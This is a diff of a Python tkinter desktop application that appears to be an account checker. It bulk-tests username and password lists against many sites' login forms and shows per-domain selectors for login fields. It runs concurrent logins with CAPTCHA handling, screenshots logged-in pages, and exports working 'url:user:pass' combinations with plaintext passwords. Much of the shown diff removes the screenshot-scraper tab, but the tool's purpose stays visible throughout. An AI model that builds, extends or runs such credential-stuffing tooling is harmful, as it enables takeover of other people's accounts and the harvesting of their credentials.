-                  font=("Segoe UI", 9, "bold")).pack(anchor="w", pady=(0, 4))
-        domain_list = tk.Listbox(
-            left,
-            bg=C["surface"], fg=C["fg"],
-            selectbackground=C["accent"], selectforeground=C["bg"],
-            font=("Consolas", 9),
-            activestyle="none", bd=0, highlightthickness=0,
-            width=28, height=18,
-        )
-        domain_list.pack(fill="y", expand=False)
-
-        field_defs = [
-            ("cookie", "Cookie / consent close button"),
-            ("login_trigger", "Login modal trigger button/link"),
-            ("login_tab", "Login tab inside modal"),
-            ("user", "Username / Email field"),
-            ("pass", "Password field"),
-            ("submit", "Login / Submit button"),
-            ("logout", "Logout button (optional)"),
-        ]
-
-        widgets: dict[str, tk.Text] = {}
-        for key, label in field_defs:
-            row = ttk.Frame(right)
-            row.pack(fill="x", pady=(0, 6))
-            ttk.Label(row, text=label, font=("Segoe UI", 9, "bold")).pack(anchor="w")
-            txt = tk.Text(
-                row,
-                height=2,
-                bg=C["surface"], fg=C["fg"],
-                insertbackground=C["fg"],
-                font=("Consolas", 9),
-                wrap="none",
-                relief="flat",
-                borderwidth=2,
-            )
-            txt.pack(fill="x")
-            widgets[key] = txt
-
-        def _refresh_domain_list():
-            domain_list.delete(0, "end")
-            for dom in sorted(self._dom_domain_overrides.keys()):
-                domain_list.insert("end", dom)
-
-        def _clear_fields():
-            for txt in widgets.values():
-                txt.delete("1.0", "end")
-
-        def _load_domain(domain_key: str):
-            _clear_fields()
-            cfg = self._dom_domain_overrides.get(domain_key, {})
-            for key in widgets.keys():
-                val = cfg.get(key, "")
-                if val:
-                    widgets[key].insert("1.0", val)
-
-        def _on_pick_domain(_event=None):
-            sel = domain_list.curselection()
-            if not sel:
-                return
-            dom = domain_list.get(sel[0]).strip()
-            domain_var.set(dom)
-            _load_domain(dom)
-
-        domain_list.bind("<<ListboxSelect>>", _on_pick_domain)
-
-        def _save_one():
-            dom = domain_var.get().strip().lower()
-            if not dom:
-                messagebox.showwarning("Missing domain", "Please enter a domain.", parent=dlg)
-                return
-            cfg: dict[str, str] = {}
-            for key, txt in widgets.items():
-                cfg[key] = txt.get("1.0", "end").strip()
-            self._dom_domain_overrides[dom] = cfg
-            self._save_dom_settings()
-            _refresh_domain_list()
-            self._statusbar.config(text=f"Domain DOM override saved: {dom}")
-
-        def _delete_one():
-            dom = domain_var.get().strip().lower()
-            if not dom:
-                return
-            if dom in self._dom_domain_overrides:
-                del self._dom_domain_overrides[dom]
-                self._save_dom_settings()
-                _refresh_domain_list()
-                _clear_fields()
-                self._statusbar.config(text=f"Domain DOM override removed: {dom}")
-
-        btns = ttk.Frame(dlg)
-        btns.pack(fill="x", padx=12, pady=(0, 12))
-        ttk.Button(btns, text="Save Domain", command=_save_one).pack(side="right", padx=(4, 0))
-        ttk.Button(btns, text="Delete Domain", command=_delete_one).pack(side="right", padx=(4, 0))
-        ttk.Button(btns, text="Clear Fields", command=_clear_fields).pack(side="right", padx=(4, 0))
-        ttk.Button(btns, text="Close", command=dlg.destroy).pack(side="right")
-
-        _refresh_domain_list()
-        domain_entry.focus_set()
-
-    # ================================================================
-    # Scraper tab
-    # ================================================================
-
-    def _build_scraper_tab(self):
-        C   = self._palette
-        tab = self._scraper_tab
-
-        # ── Top toolbar ───────────────────────────────────────────────────
-        toolbar = ttk.Frame(tab)
-        toolbar.pack(fill="x", pady=(6, 2), padx=6)
-
-        # Row 1: CSV loader
-        ttk.Button(toolbar, text="📂 Load CSV",
-                   command=self._scraper_load_csv).pack(side="left", padx=(0, 6))
-        self._scraper_csv_var = tk.StringVar(value="No file loaded")
-        ttk.Label(toolbar, textvariable=self._scraper_csv_var,
-                  foreground=C["green"]).pack(side="left", padx=(0, 8))
-        self._scraper_count_var = tk.StringVar(value="")
-        ttk.Label(toolbar, textvariable=self._scraper_count_var,
-                  foreground=C["accent"]).pack(side="left", padx=(0, 16))
-
-        ttk.Separator(toolbar, orient="vertical").pack(side="left", fill="y",
-                                                       padx=6, pady=2)
-
-        # Post-login URL inline
-        ttk.Label(toolbar, text="Post-login URL:").pack(side="left", padx=(0, 4))
-        self._scraper_url_var = tk.StringVar(value="")
-        ttk.Entry(toolbar, textvariable=self._scraper_url_var,
-                  width=46).pack(side="left", padx=(0, 6))
-        ttk.Label(toolbar,
-                  text="(leave blank = screenshot login result page)",
-                  foreground=C["muted"]).pack(side="left")
-
-        # Row 2: Action buttons
-        row2 = ttk.Frame(tab)
-        row2.pack(fill="x", pady=(2, 4), padx=6)
-
-        self._btn_scrape = ttk.Button(
-            row2, text="▶ Screenshot All",
-            command=self._scraper_start, state="disabled")
-        self._btn_scrape.pack(side="left", padx=(0, 6))
-
-        self._btn_scrape_stop = ttk.Button(
-            row2, text="■ Stop",
-            command=self._scraper_stop, state="disabled")
-        self._btn_scrape_stop.pack(side="left", padx=(0, 6))
-
-        self._btn_scrape_export = ttk.Button(
-            row2, text="⬇ Export JPEGs + CSV",
-            command=self._scraper_export, state="disabled")
-        self._btn_scrape_export.pack(side="left", padx=(0, 12))
-
-        self._scraper_progress_var = tk.StringVar(value="")
-        ttk.Label(row2, textvariable=self._scraper_progress_var,
-                  foreground=C["accent"]).pack(side="left")
-
-        # ── Paned: Results list (left) | Screenshot thumbnail (right) ─────
-        pane = tk.PanedWindow(tab, orient="horizontal",
-                              sashwidth=5, sashrelief="flat",
-                              bg=C["bg"], bd=0)
-        pane.pack(fill="both", expand=True, padx=6, pady=(0, 6))
-
-        # ── LEFT: results list ────────────────────────────────────────────
-        list_frame = ttk.Frame(pane)
-        pane.add(list_frame, minsize=260, width=320)
-
-        ttk.Label(list_frame, text="Results",
-                  font=("Consolas", 10, "bold")).pack(anchor="w", pady=(4, 2))
-
-        tree_wrap = ttk.Frame(list_frame)
-        tree_wrap.pack(fill="both", expand=True)
-
-        cols = ("Status", "Domain", "Username")
-        self._scraper_list = ttk.Treeview(
-            tree_wrap, columns=cols, show="headings",
-            selectmode="browse", height=22)
-        self._scraper_list.heading("Status",   text="Status")
-        self._scraper_list.heading("Domain",   text="Domain")
-        self._scraper_list.heading("Username", text="Username")
-        self._scraper_list.column("Status",   width=90,  minwidth=70, stretch=False)
-        self._scraper_list.column("Domain",   width=120, minwidth=80)
-        self._scraper_list.column("Username", width=130, minwidth=80)
-
-        list_vsb = ttk.Scrollbar(tree_wrap, orient="vertical",
-                                 command=self._scraper_list.yview)
-        self._scraper_list.configure(yscrollcommand=list_vsb.set)
-        self._scraper_list.grid(row=0, column=0, sticky="nsew")
-        list_vsb.grid(row=0, column=1, sticky="ns")
-        tree_wrap.rowconfigure(0, weight=1)
-        tree_wrap.columnconfigure(0, weight=1)
-
-        # Tag colours
-        self._scraper_list.tag_configure("success", foreground=C["green"])
-        self._scraper_list.tag_configure("failed",  foreground=C["red"])
-        self._scraper_list.tag_configure("odd",  background=C["row_odd"])
-        self._scraper_list.tag_configure("even", background=C["row_even"])
-
-        # Click in list → show that screenshot on the right
-        self._scraper_list.bind("<<TreeviewSelect>>", self._scraper_list_select)
-
-        # ── RIGHT: thumbnail gallery ──────────────────────────────────────
-        gallery_frame = ttk.Frame(pane)
-        pane.add(gallery_frame, minsize=300)
-
-        ttk.Label(gallery_frame, text="Screenshots",
-                  font=("Consolas", 10, "bold")).pack(anchor="w", pady=(4, 2))
-
-        gallery_outer = ttk.Frame(gallery_frame)
-        gallery_outer.pack(fill="both", expand=True)
-
-        self._gallery_canvas = tk.Canvas(
-            gallery_outer, bg=C["bg"], highlightthickness=0)
-        gallery_vsb = ttk.Scrollbar(gallery_outer, orient="vertical",
-                                    command=self._gallery_canvas.yview)
-        self._gallery_canvas.configure(yscrollcommand=gallery_vsb.set)
-        gallery_vsb.pack(side="right", fill="y")
-        self._gallery_canvas.pack(side="left", fill="both", expand=True)
-
-        # Inner frame for thumbnail cards
-        self._gallery_frame = ttk.Frame(self._gallery_canvas)
-        self._gallery_frame_id = self._gallery_canvas.create_window(
-            (0, 0), window=self._gallery_frame, anchor="nw")
-
-        def _on_frame_cfg(event):
-            self._gallery_canvas.configure(
-                scrollregion=self._gallery_canvas.bbox("all"))
-        self._gallery_frame.bind("<Configure>", _on_frame_cfg)
-
-        def _on_canvas_cfg(event):
-            self._gallery_canvas.itemconfig(
-                self._gallery_frame_id, width=event.width)
-            # Recalculate column count based on canvas width
-            cols = max(1, event.width // (self._THUMB_W + 16))
-            if cols != self._gallery_cols:
-                self._gallery_cols = cols
-                self._scraper_relayout_gallery()
-        self._gallery_canvas.bind("<Configure>", _on_canvas_cfg)
-
-        def _on_mousewheel(event):
-            self._gallery_canvas.yview_scroll(
-                int(-1 * (event.delta / 120)), "units")
-        self._gallery_canvas.bind("<MouseWheel>", _on_mousewheel)
-        self._gallery_frame.bind("<MouseWheel>", _on_mousewheel)
-
-        # Thumbnail card tracking
-        self._gallery_card_count = 0
-        self._gallery_cols = 3          # updated on resize
-        self._gallery_cards: list[tk.Frame] = []  # all card widgets in order
-
-        # All result rows for export
-        self._scraper_results: list[dict] = []
-
-    # ── Scraper helpers ───────────────────────────────────────────────────
-
-    def _scraper_load_csv(self):
-        """Open a previously exported CSV and load SUCCESS rows."""
-        path = filedialog.askopenfilename(
-            title="Select exported CSV",
-            filetypes=[("CSV files", "*.csv"), ("All files", "*.*")],
-        )
-        if not path:
-            return
-        import csv as _csv
-        creds: list[dict] = []
-        try:
-            with open(path, newline="", encoding="utf-8") as fh:
-                reader = _csv.DictReader(fh)
-                for row in reader:
-                    status = row.get("Status", "").strip()
-                    if "SUCCESS" not in status.upper():
-                        continue
-                    url  = row.get("URL", "").strip()
-                    user = row.get("Username", "").strip()
-                    pw   = row.get("Password", "").strip()
-                    dom  = row.get("Domain",   "").strip()
-                    if url and user:
-                        creds.append({"url": url, "username": user,
-                                      "password": pw, "domain": dom})
-        except Exception as exc:
-            messagebox.showerror("Load error", str(exc))
-            return
-
-        if not creds:
-            messagebox.showinfo("No success rows",
-                                "No rows with status SUCCESS found in the CSV.")
-            return
-
-        self._scraper_creds = creds
-        fname = os.path.basename(path)
-        self._scraper_csv_var.set(fname)
-        self._scraper_count_var.set(f"{len(creds):,} SUCCESS credential(s) loaded")
-        self._btn_scrape.config(state="normal")
-        self._statusbar.config(
-            text=f"Scraper: loaded {len(creds):,} SUCCESS credentials from {fname}")
-
-    def _scraper_start(self):
-        if not self._scraper_creds:
-            messagebox.showinfo("No credentials", "Load a CSV first.")
-            return
-        post_url = self._scraper_url_var.get().strip()
-
-        # Clear previous results
-        for widget in self._gallery_frame.winfo_children():
-            widget.destroy()
-        for item in self._scraper_list.get_children():
-            self._scraper_list.delete(item)
-        self._scraper_photos.clear()
-        self._scraper_screenshots.clear()
-        self._scraper_results.clear()
-        self._gallery_cards.clear()
-        self._gallery_card_count = 0
-        self._scraper_stop_flag.clear()
-        self._scraper_running = True
-        self._btn_scrape.config(state="disabled")
-        self._btn_scrape_stop.config(state="normal")
-        self._btn_scrape_export.config(state="disabled")
-        self._scraper_progress_var.set(f"0 / {len(self._scraper_creds)}")
-
-        threading.Thread(
-            target=self._scraper_worker,
-            args=(list(self._scraper_creds), post_url),
-            daemon=True,
-        ).start()
-        self._scraper_poll()
-
-    def _scraper_stop(self):
-        self._scraper_stop_flag.set()
-        self._btn_scrape_stop.config(state="disabled")
-        self._statusbar.config(text="Scraper: stopping…")
-
-    def _scraper_worker(self, creds: list[dict],
-                        post_url: str):
-        """Background thread: iterate credentials, call scrape_after_login."""
-        total   = len(creds)
-        done    = 0
-        workers = max(1, self._concurrency_var.get())
-
-        with ThreadPoolExecutor(max_workers=workers) as pool:
-            future_map = {}
-            for idx, entry in enumerate(creds):
-                if self._scraper_stop_flag.is_set():
-                    break
-                future = pool.submit(
-                    scrape_after_login,
-                    entry, post_url,
-                )
-                future_map[future] = (idx, entry)
-
-            for future in as_completed(future_map):
-                if self._scraper_stop_flag.is_set():
-                    future.cancel()
-                    continue
-                idx, entry = future_map[future]
-                try:
-                    outcome = future.result()
-                except Exception as exc:
-                    outcome = {"status": f"ERROR: {exc!s:.60}",
-                               "screenshot": None, "final_url": ""}
-                done += 1
-                self._scraper_queue.put((idx, entry, outcome, done, total))
-
-        self._scraper_queue.put(None)   # sentinel — all done
-
-    def _scraper_poll(self):
-        """Poll the scraper result queue and add thumbnail cards to gallery."""
-        try:
-            while True:
-                item = self._scraper_queue.get_nowait()
-                if item is None:
-                    # Done
-                    self._scraper_running = False
-                    self._btn_scrape.config(state="normal")
-                    self._btn_scrape_stop.config(state="disabled")
-                    if self._scraper_screenshots:
-                        self._btn_scrape_export.config(state="normal")
-                    total_done = len(self._scraper_screenshots)
-                    self._statusbar.config(
-                        text=f"Scraper: finished. {total_done} screenshot(s) captured.")
-                    return
-
-                idx, entry, outcome, done, total = item
-                status     = outcome.get("status", "UNKNOWN")
-                jpeg_bytes = outcome.get("screenshot")
-                final_url  = outcome.get("final_url", "")
-
-                self._scraper_progress_var.set(f"{done} / {total}")
-
-                # Store for export
-                store_idx = len(self._scraper_screenshots)
-                self._scraper_screenshots.append({
-                    "entry":      entry,
-                    "jpeg_bytes": jpeg_bytes,
-                    "status":     status,
-                    "final_url":  final_url,
-                })
-                self._scraper_results.append({
-                    "domain":    entry.get("domain", ""),
-                    "url":       entry.get("url", ""),
-                    "username":  entry.get("username", ""),
-                    "password":  entry.get("password", ""),
-                    "status":    status,
-                    "final_url": final_url,
-                    "screenshot": "(yes)" if jpeg_bytes else "(none)",
-                })
-
-                # ── Results list row ──────────────────────────────────────
-                tag    = "success" if "SUCCESS" in status else "failed"
-                n_rows = len(self._scraper_list.get_children())
-                row_tag = "odd" if n_rows % 2 else "even"
-                short_status = status[:14] if len(status) > 14 else status
-                iid = self._scraper_list.insert(
-                    "", "end",
-                    iid=str(store_idx),
-                    values=(short_status,
-                            entry.get("domain", "")[:22],
-                            entry.get("username", "")[:22]),
-                    tags=(tag, row_tag),
-                )
-                # Auto-scroll list to latest
-                self._scraper_list.see(iid)
-
-                # ── Thumbnail card ────────────────────────────────────────
-                self._scraper_add_thumbnail(store_idx, entry, outcome)
-
-        except queue.Empty:
-            pass
-
-        if self._scraper_running:
-            self._scraper_poll_id = self.after(POLL_MS, self._scraper_poll)
-
-    # ── Thumbnail / preview helpers ───────────────────────────────────────
-
-    _THUMB_W = 200
-    _THUMB_H = 150
-
-    def _scraper_add_thumbnail(self, store_idx: int, entry: dict, outcome: dict):
-        """Create one thumbnail card in the gallery frame."""
-        import io as _io
-        try:
-            from PIL import Image as _PILImage, ImageTk as _PILImageTk
-        except ImportError:
-            _PILImage    = None  # type: ignore
-            _PILImageTk  = None  # type: ignore
-
-        C          = self._palette
-        jpeg_bytes = outcome.get("screenshot")
-        status     = outcome.get("status", "UNKNOWN")
-        username   = entry.get("username", "?")
-        domain     = entry.get("domain", entry.get("url", "?"))
-
-        card = tk.Frame(
-            self._gallery_frame,
-            bg=C["surface"],
-            highlightbackground=C["green"] if "SUCCESS" in status else C["red"],
-            highlightthickness=2,
-        )
-        self._gallery_cards.append(card)
-        # Position is handled by _scraper_relayout_gallery
-        col = self._gallery_card_count % max(1, self._gallery_cols)
-        row = self._gallery_card_count // max(1, self._gallery_cols)
-        self._gallery_card_count += 1
-        card.grid(row=row, column=col, padx=5, pady=5, sticky="nw")
-
-        # ── Thumbnail image ───────────────────────────────────────────────
-        img_frame = tk.Frame(card, bg=C["bg"],
-                             width=self._THUMB_W, height=self._THUMB_H)
-        img_frame.pack_propagate(False)
-        img_frame.pack(padx=3, pady=(3, 0))
-
-        img_label = tk.Label(img_frame, bg=C["bg"],
-                             text="…", fg=C["muted"],
-                             font=("Consolas", 9))
-        img_label.pack(expand=True, fill="both")
-
-        if jpeg_bytes and _PILImage is not None:
-            try:
-                _LANCZOS = getattr(
-                    _PILImage, "LANCZOS",
-                    getattr(_PILImage.Resampling, "LANCZOS", 1),
-                )
-                img = _PILImage.open(_io.BytesIO(jpeg_bytes))
-                img.thumbnail(
-                    (self._THUMB_W, self._THUMB_H), _LANCZOS)  # type: ignore[arg-type]
-                photo = _PILImageTk.PhotoImage(img)  # type: ignore[union-attr]
-                self._scraper_photos.append(photo)
-                img_label.config(image=photo, text="",
-                                 width=img.width, height=img.height)
-
-                def _open(e, b=jpeg_bytes, en=entry, s=status):
-                    self._scraper_open_preview(b, en, s)
-                img_label.bind("<Button-1>", _open)
-                card.bind("<Button-1>", _open)
-                img_label.config(cursor="hand2")
-            except Exception:
-                img_label.config(text="(image error)", fg=C["muted"])
-        elif not jpeg_bytes:
-            img_label.config(text="No screenshot\n(login failed?)", fg=C["muted"])
-        else:
-            img_label.config(text="Pillow not installed", fg=C["muted"])
-
-        # ── Caption strip ─────────────────────────────────────────────────
-        caption = tk.Frame(card, bg=C["surface"])
-        caption.pack(fill="x", padx=3, pady=(2, 3))
-
-        status_color = C["green"] if "SUCCESS" in status else C["red"]
-        tk.Label(caption, text=username[:28], bg=C["surface"], fg=C["fg"],
-                 font=("Consolas", 8, "bold"), anchor="w").pack(
-                     fill="x")
-        tk.Label(caption, text=domain[:30], bg=C["surface"], fg=C["muted"],
-                 font=("Consolas", 7), anchor="w").pack(fill="x")
-        tk.Label(caption, text=status[:22], bg=C["surface"], fg=status_color,
-                 font=("Consolas", 7, "bold"), anchor="w").pack(fill="x")
-
-        # Clicking caption also opens preview
-        if jpeg_bytes:
-            for w in (caption,) + tuple(caption.winfo_children()):
-                def _cap_open(e, b=jpeg_bytes, en=entry, s=status):
-                    self._scraper_open_preview(b, en, s)
-                w.bind("<Button-1>", _cap_open)
-                w.config(cursor="hand2")  # type: ignore[attr-defined]
-
-    def _scraper_relayout_gallery(self):
-        """Re-grid all cards when the gallery width changes column count."""
-        cols = max(1, self._gallery_cols)
-        for i, card in enumerate(self._gallery_cards):
-            card.grid(row=i // cols, column=i % cols,
-                      padx=5, pady=5, sticky="nw")
-
-    def _scraper_list_select(self, event=None):
-        """When user clicks a row in the results list, scroll gallery to it."""
-        sel = self._scraper_list.selection()
-        if not sel:
-            return
-        try:
-            idx = int(sel[0])
-        except (ValueError, IndexError):
-            return
-        if 0 <= idx < len(self._gallery_cards):
-            card = self._gallery_cards[idx]
-            # Scroll canvas so the card is visible
-            self._gallery_frame.update_idletasks()
-            cy = card.winfo_y()
-            ch = card.winfo_height()
-            total_h = self._gallery_frame.winfo_height()
-            if total_h > 0:
-                frac = cy / total_h
-                self._gallery_canvas.yview_moveto(frac)
-            # Highlight selected card
-            C = self._palette
-            for i, c in enumerate(self._gallery_cards):
-                item = self._scraper_screenshots[i]
-                ok   = "SUCCESS" in item.get("status", "")
-                c.config(
-                    highlightbackground=(
-                        C["accent"] if i == idx
-                        else (C["green"] if ok else C["red"])
-                    ),
-                    highlightthickness=3 if i == idx else 2,
-                )
-
-    def _scraper_open_preview(self, jpeg_bytes: bytes, entry: dict, status: str):
-        """Open a Toplevel window showing the screenshot with zoom, scroll, and copy buttons."""
-        import io as _io
-        try:
-            from PIL import Image as _PILImage, ImageTk as _PILImageTk
-            _LANCZOS = getattr(_PILImage, "LANCZOS",
-                               getattr(_PILImage.Resampling, "LANCZOS", 1))
-        except ImportError:
-            messagebox.showerror(
-                "Pillow missing",
-                "Install Pillow to view screenshots:\n  pip install Pillow")
-            return
-
-        C        = self._palette
-        username = entry.get("username", "?")
-        domain   = entry.get("domain", entry.get("url", "?"))
-
-        win = tk.Toplevel(self)
-        win.title(f"{username} @ {domain}  —  {status}")
-        win.geometry("1100x820")
-        win.configure(bg=C["bg"])
-
-        try:
-            orig_img = _PILImage.open(_io.BytesIO(jpeg_bytes))
-        except Exception as exc:
-            tk.Label(win, text=f"Cannot load image:\n{exc}").pack(expand=True)
-            return
-
-        _zoom: list      = [1.0]
-        _photo_ref: list = [None]
-
-        # ── Pre-create bottom panels – packed before canvas so they always stay visible ──
-        cred_outer = ttk.Frame(win)
-        zoom_frame = ttk.Frame(win)
-        cred_outer.pack(side="bottom", fill="x", padx=8, pady=(4, 4))
-        zoom_frame.pack(side="bottom", fill="x", padx=8, pady=(2, 0))
-
-        # ── Canvas + scrollbars ───────────────────────────────────────────
-        canvas_frame = ttk.Frame(win)
-        canvas_frame.pack(fill="both", expand=True, padx=6, pady=(6, 0))
-
-        canvas = tk.Canvas(canvas_frame, bg="#1a1a1a", highlightthickness=0)
-        vsb = ttk.Scrollbar(canvas_frame, orient="vertical",   command=canvas.yview)
-        hsb = ttk.Scrollbar(canvas_frame, orient="horizontal", command=canvas.xview)
-        canvas.configure(yscrollcommand=vsb.set, xscrollcommand=hsb.set)
-        vsb.pack(side="right",  fill="y")
-        hsb.pack(side="bottom", fill="x")
-        canvas.pack(fill="both", expand=True)
-
-        def _render_image():
-            canvas.delete("all")
-            _photo_ref[0] = None
-            zoom  = _zoom[0]
-            new_w = max(1, int(orig_img.width  * zoom))
-            new_h = max(1, int(orig_img.height * zoom))
-            try:
-                disp  = orig_img.resize((new_w, new_h), _LANCZOS) if zoom != 1.0 else orig_img
-                photo = _PILImageTk.PhotoImage(disp)
-                _photo_ref[0] = photo
-                canvas.create_image(0, 0, anchor="nw", image=photo)
-                canvas.configure(scrollregion=(0, 0, new_w, new_h))
-            except Exception as exc:
-                canvas.create_text(10, 10, anchor="nw",
-                                   text=f"Cannot display:\n{exc}",
-                                   fill=C.get("muted", "#888"))
-            _zoom_var.set(f"{int(zoom * 100)}%")
-
-        def _zoom_in(e=None):
-            _zoom[0] = min(5.0, round(_zoom[0] * 1.25, 4))
-            _render_image()
-
-        def _zoom_out(e=None):
-            _zoom[0] = max(0.05, round(_zoom[0] / 1.25, 4))
-            _render_image()
-
-        def _zoom_fit():
-            win.update_idletasks()
-            cw = max(canvas.winfo_width(),  400)
-            ch = max(canvas.winfo_height(), 300)
-            _zoom[0] = round(min(cw / orig_img.width, ch / orig_img.height), 4)
-            _render_image()
-
-        def _zoom_reset():
-            _zoom[0] = 1.0
-            _render_image()
-
-        def _on_mousewheel(e):
-            if e.state & 0x4:  # Ctrl held → zoom
-                if e.delta > 0:
-                    _zoom_in()
-                else:
-                    _zoom_out()
-            else:
-                canvas.yview_scroll(int(-1 * (e.delta / 120)), "units")
-        canvas.bind("<MouseWheel>", _on_mousewheel)
-        win.bind("<Control-equal>", _zoom_in)
-        win.bind("<Control-minus>", _zoom_out)
-        win.bind("<Control-0>",     lambda e: _zoom_fit())
-
-        # ── Zoom controls ─────────────────────────────────────────────────
-        _zoom_var = tk.StringVar(value="100%")
-        ttk.Button(zoom_frame, text="🔍−", width=4, command=_zoom_out).pack(side="left")
-        ttk.Label(zoom_frame, textvariable=_zoom_var, width=6,
-                  anchor="center").pack(side="left", padx=2)
-        ttk.Button(zoom_frame, text="🔍+", width=4, command=_zoom_in).pack(side="left")
-        ttk.Button(zoom_frame, text="Fit",  width=5, command=_zoom_fit).pack(side="left", padx=(6, 2))
-        ttk.Button(zoom_frame, text="1:1",  width=5, command=_zoom_reset).pack(side="left")
-
-        # ── Credential strip ──────────────────────────────────────────────
-        def _make_copy_field(parent, label, value):
-            f = ttk.Frame(parent)
-            ttk.Label(f, text=label, font=("Segoe UI", 8, "bold"),
-                      foreground=C.get("muted", "#888")).pack(side="left")
-            var = tk.StringVar(value=value)
-            ttk.Entry(f, textvariable=var, state="readonly",
-                      width=28).pack(side="left", padx=(2, 1))
-            def _copy():
-                win.clipboard_clear()
-                win.clipboard_append(value)
-            ttk.Button(f, text="📋", width=3, command=_copy).pack(side="left")
-            return f
-
-        row1 = ttk.Frame(cred_outer)
-        row1.pack(fill="x", pady=1)
-        _make_copy_field(row1, "Domain:  ", entry.get("domain", "")).pack(side="left", padx=(0, 12))
-        _make_copy_field(row1, "URL:     ", entry.get("url", "")).pack(side="left", padx=(0, 12))
-        _make_copy_field(row1, "Status:  ", status).pack(side="left")
-
-        row2 = ttk.Frame(cred_outer)
-        row2.pack(fill="x", pady=1)
-        _make_copy_field(row2, "Username:", entry.get("username", "")).pack(side="left", padx=(0, 12))
-        _make_copy_field(row2, "Password:", entry.get("password", "")).pack(side="left", padx=(0, 12))
-
-        def _copy_all():
-            text = (f"{entry.get('url','')}"
-                    f":{entry.get('username','')}"
-                    f":{entry.get('password','')}")
-            win.clipboard_clear()
-            win.clipboard_append(text)
-        ttk.Button(row2, text="📋 Copy All", command=_copy_all).pack(side="left", padx=4)
-
-        # Auto-fit after window is drawn
-        win.after(80, _zoom_fit)
-
-    def _scraper_export(self):
-        """Save JPEGs and a results CSV to a chosen folder."""
-        if not self._scraper_screenshots:
-            messagebox.showinfo("Nothing to export", "Run the scraper first.")
-            return
-        folder = filedialog.askdirectory(title="Select folder to save screenshots")
-        if not folder:
-            return
-        import csv as _csv, io as _io
-        rows = []
-        saved = 0
-        for i, item in enumerate(self._scraper_screenshots):
-            entry     = item["entry"]
-            jbytes    = item["jpeg_bytes"]
-            status    = item["status"]
-            final_url = item["final_url"]
-            domain    = entry.get("domain", "unknown")
-            username  = entry.get("username", "unknown")
-            # Sanitise filename
-            safe_dom  = "".join(c if c.isalnum() or c in "-_." else "_"
-                                for c in domain)
-            safe_usr  = "".join(c if c.isalnum() or c in "-_." else "_"
-                                for c in username)
-            fname = f"{safe_dom}_{safe_usr}_{i+1}.jpg"
-            fpath = os.path.join(folder, fname)
-            if jbytes:
-                try:
-                    with open(fpath, "wb") as fh:
-                        fh.write(jbytes)
-                    saved += 1
-                except Exception:
-                    fname = "(save error)"
-            else:
-                fname = "(no screenshot)"
-            rows.append({
-                "domain":    domain,
-                "url":       entry.get("url", ""),
-                "username":  username,
-                "password":  entry.get("password", ""),
-                "status":    status,
-                "final_url": final_url,
-                "screenshot_file": fname,
-            })
-
-        csv_path = os.path.join(folder, "results.csv")
-        try:
-            with open(csv_path, "w", newline="", encoding="utf-8") as fh:
-                writer = _csv.DictWriter(
-                    fh,
-                    fieldnames=["domain", "url", "username", "password",
-                                "status", "final_url", "screenshot_file"],
-                )
-                writer.writeheader()
-                writer.writerows(rows)
-        except Exception as exc:
-            messagebox.showerror("CSV error", str(exc))
-            return
-
-        messagebox.showinfo(
-            "Exported",
-            f"Saved {saved} screenshot(s) and results.csv to:\n{folder}")
-
-
-
     # ================================================================
     # CAPTCHA & Session helpers
     # ================================================================
 
     def _update_session_label(self):
+        if not hasattr(self, "_session_var"):
+            return
         if load_session_exists():
             self._session_var.set("Session: ACTIVE (state.json)")
         else:
@@ -2351,6 +1351,8 @@ class App(tk.Tk):
     # ================================================================
 
     def _update_recipe_label(self):
+        if not hasattr(self, "_recipe_var"):
+            return
         if recipe_exists():
             self._recipe_var.set(f"Recipe: ACTIVE ({RECIPE_FILE.name})")
         else:
@@ -2429,7 +1431,8 @@ class App(tk.Tk):
             text=f"⏺ Recording — Chrome will open at {url}. "
                   "Perform your full login, then CLOSE the browser window.")
         self.update_idletasks()
-        self._btn_record.config(state="disabled")
+        if hasattr(self, "_btn_record"):
+            self._btn_record.config(state="disabled")
 
         def _status_cb(msg: str):
             self.after(0, lambda m=msg: self._statusbar.config(text=m))
@@ -2446,7 +1449,8 @@ class App(tk.Tk):
         threading.Thread(target=_worker, daemon=True).start()
 
     def _on_record_done(self, result: str):
-        self._btn_record.config(state="normal")
+        if hasattr(self, "_btn_record"):
+            self._btn_record.config(state="normal")
         self._update_recipe_label()
         self._update_session_label()
         self._statusbar.config(text=f"Recording done: {result}")
@@ -3599,10 +2603,8 @@ class App(tk.Tk):
         self._check_domain_snap    = self._domain_var.get().strip().lower()
         self._check_url_kw_snap    = self._url_keyword_var.get().strip().lower()
         self._check_user_mode_snap = self._username_filter_var.get()
+        self._check_status_snap    = self._status_filter.get()
         self._check_login_url_snap    = self._login_url_var.get().strip()
-        self._check_login_url_map_snap = self._parse_login_url_map(
-            self._login_url_map_var.get()
-        )
         self._check_success_url_snap  = self._success_url_var.get().strip()
         self._check_success_exact_snap = self._success_exact_var.get()
         self._check_success_dom_snap   = self._success_dom_var.get().strip()
@@ -3626,6 +2628,7 @@ class App(tk.Tk):
         self._checker_screenshots.clear()
         self._checker_screenshot_map.clear()
         self._btn_view_screenshots.config(state="disabled")
+        self._anti_captcha_alerted_messages.clear()
 
         # Show which filters are active
         parts = []
@@ -3695,12 +2698,13 @@ class App(tk.Tk):
             domain_snap      = getattr(self, "_check_domain_snap", "")
             url_kw_snap      = getattr(self, "_check_url_kw_snap", "")
             user_mode_snap   = getattr(self, "_check_user_mode_snap", "All")
+            status_snap      = getattr(self, "_check_status_snap", "All")
             login_url_snap    = getattr(self, "_check_login_url_snap", "")
-            login_url_map_snap = getattr(self, "_check_login_url_map_snap", {})
             success_url_snap  = getattr(self, "_check_success_url_snap", "")
             success_exact_snap = getattr(self, "_check_success_exact_snap", True)
+            results_snap = dict(self._results)
 
-            def _passes(entry: dict) -> bool:
+            def _passes(entry: dict, status: str = "Pending") -> bool:
                 if domain_snap and domain_snap not in entry["domain"].lower() \
                         and domain_snap not in entry["url"].lower():
                     return False
@@ -3708,10 +2712,12 @@ class App(tk.Tk):
                     return False
                 if not self._username_matches_filter(entry["username"], user_mode_snap):
                     return False
+                if not self._status_matches_filter(status, status_snap):
+                    return False
                 return True
 
-            def _do_check(entry: dict) -> tuple[dict, str, bytes | None, str | None]:
-                """Run in a worker thread — returns (entry, status, screenshot_bytes, html)."""
+            def _do_check(entry: dict) -> tuple[dict, str, bytes | None]:
+                """Run in a worker thread — returns (entry, status, screenshot_bytes)."""
                 print(f"[Info] Start Checking: {entry['domain']} / {entry['username']} / {entry['password']}")
                 if self._stop_flag.is_set():
                     return entry, "Stopped", None
@@ -3726,11 +2732,14 @@ class App(tk.Tk):
                 # changes made in the UI mid-run take effect immediately.
                 screenshot_on_current = self._get_screenshot_on()
                 screenshot = None
+                def _on_captcha_state(state: str, stage: str) -> None:
+                    self._result_queue.put(
